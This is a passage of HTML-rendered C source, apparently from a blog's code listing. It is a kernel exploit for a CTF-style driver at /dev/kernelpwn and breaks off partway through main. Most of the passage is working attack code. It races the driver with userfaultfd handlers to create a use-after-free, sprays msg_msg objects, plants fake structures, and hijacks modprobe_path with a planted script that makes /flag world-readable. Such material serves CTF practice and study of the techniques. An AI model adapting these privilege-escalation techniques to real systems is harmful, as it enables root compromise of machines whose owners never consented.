class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLOSE printf(<span class="string">&quot;\033[0m&quot;</span>);</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RED printf(<span class="string">&quot;\033[31m&quot;</span>);</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN printf(<span class="string">&quot;\033[36m&quot;</span>);</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLUE printf(<span class="string">&quot;\033[34m&quot;</span>);</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> real(a) a+kernel_base-0xffffffff81000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 0X1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_COPY        040000</span></span><br><span class="line"> </span><br><span class="line"><span class="type">size_t</span> fd;</span><br><span class="line"><span class="type">size_t</span> kernel_base;</span><br><span class="line"><span class="type">size_t</span> tmp_buf[<span class="number">0x500</span>];</span><br><span class="line"><span class="type">char</span> *msg_buf;</span><br><span class="line"><span class="type">size_t</span> fake_ops_buf[<span class="number">0x100</span>];</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> ms_qid[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">int</span> pipe_fd[<span class="number">0x20</span>][<span class="number">2</span>];</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="type">sem_t</span> sem_addmsg;</span><br><span class="line"><span class="type">sem_t</span> sem_editmsg;</span><br><span class="line"><span class="type">sem_t</span> edit_down;</span><br><span class="line"><span class="type">sem_t</span> edit_heap_next;</span><br><span class="line"><span class="type">sem_t</span> sem_edit_msg_for_modpath;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span>    next;</span><br><span class="line">    <span class="type">size_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">size_t</span>    m_type;</span><br><span class="line">    <span class="type">size_t</span>    m_ts;</span><br><span class="line">    <span class="type">size_t</span>    next;</span><br><span class="line">    <span class="type">size_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">// struct msgbuf &#123;</span></span><br><span class="line"><span class="comment">//     long mtype;</span></span><br><span class="line"><span class="comment">//     char mtext[0];</span></span><br><span class="line"><span class="comment">// &#125;;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">getMsgQueue</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">readMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * the msgp should be a pointer to the `struct msgbuf`,</span></span><br><span class="line"><span class="comment"> * and the data should be stored in msgbuf.mtext</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">writeMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    ((<span class="keyword">struct</span> msgbuf*)msgp)-&gt;mtype = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">peekMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp,</span><br><span class="line">                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">buildMsg</span><span class="params">(<span class="keyword">struct</span> msg_msg *msg, <span class="type">size_t</span> m_list_next, <span class="type">size_t</span> m_list_prev,</span></span><br><span class="line"><span class="params">              <span class="type">size_t</span> m_type, <span class="type">size_t</span> m_ts,  <span class="type">size_t</span> next, <span class="type">size_t</span> security)</span></span><br><span class="line">&#123;</span><br><span class="line">    msg-&gt;m_list.next = m_list_next;</span><br><span class="line">    msg-&gt;m_list.prev = m_list_prev;</span><br><span class="line">    msg-&gt;m_type = m_type;</span><br><span class="line">    msg-&gt;m_ts = m_ts;</span><br><span class="line">    msg-&gt;next = next;</span><br><span class="line">    msg-&gt;security = security;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">delete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">size_t</span> idx;</span><br><span class="line">&#125;delete_arg;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">edit</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">size_t</span> idx;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">char</span> *content;</span><br><span class="line">&#125;edit_arg;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">add</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">size_t</span> idx;</span><br><span class="line">    <span class="type">char</span> *content;</span><br><span class="line">&#125;add_arg;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">ErrExit</span><span class="params">(<span class="type">char</span>* err_msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">char</span> *content)</span></span><br><span class="line">&#123;</span><br><span class="line">    add_arg tmp=</span><br><span class="line">    &#123;</span><br><span class="line">        .content = content,</span><br><span class="line">    &#125;;</span><br><span class="line"> </span><br><span class="line">    ioctl(fd,<span class="number">0x20</span>,&amp;tmp);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(<span class="type">size_t</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    delete_arg tmp=</span><br><span class="line">    &#123;</span><br><span class="line">        .idx=idx,</span><br><span class="line">    &#125;;</span><br><span class="line"> </span><br><span class="line">    ioctl(fd,<span class="number">0x30</span>,&amp;tmp);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">size_t</span> idx,<span class="type">size_t</span> size,<span class="type">char</span> *content)</span></span><br><span class="line">&#123;</span><br><span class="line">    edit_arg tmp=</span><br><span class="line">    &#123;</span><br><span class="line">        .idx=idx,</span><br><span class="line">        .size = size,</span><br><span class="line">        .content=content,</span><br><span class="line">    &#125;;</span><br><span class="line"> </span><br><span class="line">    ioctl(fd,<span class="number">0x50</span>,&amp;tmp);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">leak</span><span class="params">(<span class="type">size_t</span> *content,<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]Leak: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;(<span class="type">int</span>)(size/<span class="number">8</span>);i++)</span><br><span class="line">    &#123;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">&quot;%llx\n&quot;</span>,content[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">RegisterUserfault</span><span class="params">(<span class="type">void</span> *fault_page, <span class="type">void</span>* handler)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="type">size_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features    = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    ur.range.start = (<span class="type">unsigned</span> <span class="type">long</span>)fault_page; <span class="comment">//我们要监视的区域</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>) <span class="comment">//注册缺页错误处理，当发生缺页时，程序会阻塞，此时，我们在另一个线程里操作</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="comment">//开一个线程，接收错误的信号，然后处理</span></span><br><span class="line">    <span class="type">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="type">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *page = <span class="literal">NULL</span>; <span class="comment">// 你要拷贝进去的数据</span></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *buf = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *buf2 = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *buf3 = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> page_size;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> uffd = (<span class="type">unsigned</span> <span class="type">long</span>) arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] sleep3 handler created&quot;</span>);</span><br><span class="line">    <span class="type">int</span> nready;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] sleep3 handler unblocked&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    sem_post(&amp;sem_addmsg);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    sem_wait(&amp;sem_editmsg);</span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span>* page = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="comment">// init page</span></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    <span class="built_in">memset</span>(tmp_buf, <span class="number">0</span>, <span class="number">0x50</span>);</span><br><span class="line">    tmp_buf[<span class="number">3</span>] = <span class="number">0xd00</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(page,tmp_buf,<span class="number">0x50</span>);</span><br><span class="line">    <span class="comment">// strcpy(page,&quot;Lotus_just_Test&quot;);</span></span><br><span class="line">    uc.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] sleep3 handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">UAF</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    sem_wait(&amp;sem_addmsg);</span><br><span class="line">    delete(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// RED puts(&quot;in&quot;); CLOSE</span></span><br><span class="line">    <span class="type">int</span> ret=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ms_qid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">        <span class="keyword">if</span> (ms_qid[i] &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgget!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x2</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(msg_buf, <span class="string">&#x27;A&#x27;</span> + i, <span class="number">0X400</span> - <span class="number">8</span>);</span><br><span class="line">        ret = msgsnd(ms_qid[<span class="number">0</span>], msg_buf, <span class="number">0x400</span> - <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgsnd!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    RED <span class="title function_">puts</span><span class="params">(<span class="string">&quot;[*] msg_msg spraying finish.&quot;</span>)</span>; CLOSE</span><br><span class="line">    <span class="title function_">sem_post</span><span class="params">(&amp;sem_editmsg)</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">fault_handler_thread2</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> uffd = (<span class="type">unsigned</span> <span class="type">long</span>) arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] edit heap-&gt;next handler created&quot;</span>);</span><br><span class="line">    <span class="type">int</span> nready;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] edit heap-&gt;next handler unblocked&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    sem_post(&amp;edit_heap_next);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    sem_wait(&amp;edit_down);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span>* page = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="comment">// init page</span></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    <span class="built_in">memcpy</span>(page,fake_ops_buf,<span class="number">0x208</span>);</span><br><span class="line">    <span class="comment">// leak(page,0x208);</span></span><br><span class="line">    <span class="comment">// strcpy(page,&quot;Lotus_just_Test&quot;);</span></span><br><span class="line">    uc.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] edit heap-&gt;next handler down!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">UAF2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    sem_wait(&amp;edit_heap_next);</span><br><span class="line">    delete(<span class="number">0</span>);</span><br><span class="line">    sem_post(&amp;edit_down);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">modprobe_path_hijack</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Returned to userland, setting up for fake modprobe&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh\nchmod 777 /flag\n&#x27; &gt; /tmp/Lotus.sh&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/Lotus.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/fake&quot;</span>);</span><br><span class="line">    <span class="comment">// system(&quot;cat /proc/sys/kernel/modprobe&quot;);</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Run unknown file&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;ls -al /flag&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    RED <span class="title function_">puts</span><span class="params">(<span class="string">&quot;[*]Get shell!&quot;</span>)</span>; CLOSE</span><br><span class="line">    <span class="title function_">sleep</span><span class="params">(<span class="number">5</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="type">pthread_t</span> <span class="type">edit_t</span>,<span class="type">edit2_t</span>;</span><br><span class="line"> </span><br><span class="line">    msg_buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(msg_buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    fd = open(<span class="string">&quot;/dev/kernelpwn&quot;</span>,O_RDWR);</span><br><span class="line">    buf = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span 